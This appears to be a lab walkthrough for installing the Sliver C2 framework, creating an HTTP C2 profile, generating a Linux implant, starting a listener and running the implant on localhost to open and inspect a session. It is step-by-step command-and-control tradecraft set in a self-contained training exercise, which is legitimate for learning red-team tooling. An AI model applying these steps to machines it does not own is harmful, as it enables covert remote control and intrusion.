Task 1: Install and Configure Sliver C2 Framework
Subtask 1.1: Download and Install Sliver
First, we need to download and install the Sliver C2 framework on our Linux machine.

Open a terminal and update the system packages:
sudo apt update && sudo apt upgrade -y
Install required dependencies:
sudo apt install -y git wget curl build-essential
Download the latest Sliver release:
cd /opt
sudo wget https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux -O sliver-server
sudo wget https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-client_linux -O sliver-client
Make the binaries executable:
sudo chmod +x sliver-server sliver-client
Create symbolic links for easier access:
sudo ln -s /opt/sliver-server /usr/local/bin/sliver-server
sudo ln -s /opt/sliver-client /usr/local/bin/sliver-client
Subtask 1.2: Initialize Sliver Server
Start the Sliver server for the first time to generate certificates:
sudo sliver-server
The server will generate certificates and display connection information. Note the operator config that appears. Press Ctrl+C to stop the server after initialization.

Create a dedicated directory for Sliver operations:

mkdir -p ~/sliver-lab
cd ~/sliver-lab
Subtask 1.3: Configure Sliver Client Connection
Start the Sliver server in daemon mode:
sudo sliver-server daemon &
Connect using the Sliver client:
sliver-client
You should see the Sliver console prompt. Verify the connection by running:
help
Check server status:
version
Task 2: Generate and Deploy C2 Implants
Subtask 2.1: Create HTTP C2 Profile
In the Sliver console, create an HTTP C2 profile:
http --domain localhost --website /opt/sliver-lab
Generate a basic HTTP implant:
generate --http localhost:8080 --os linux --arch amd64 --format executable --save /tmp/
Note the implant name that is generated (it will be something like PROPER_SNAKE).
Subtask 2.2: Start HTTP Listener
Start an HTTP listener on port 8080:
http --lport 8080
Verify the listener is active:
jobs
Subtask 2.3: Execute and Test Implant
Open a new terminal (keep Sliver console running) and execute the implant:
cd /tmp
chmod +x PROPER_SNAKE  # Replace with your actual implant name
./PROPER_SNAKE &
Return to the Sliver console and check for new sessions:
sessions
Interact with the session (replace SESSION_ID with actual ID):
use SESSION_ID
info
pwd
whoami
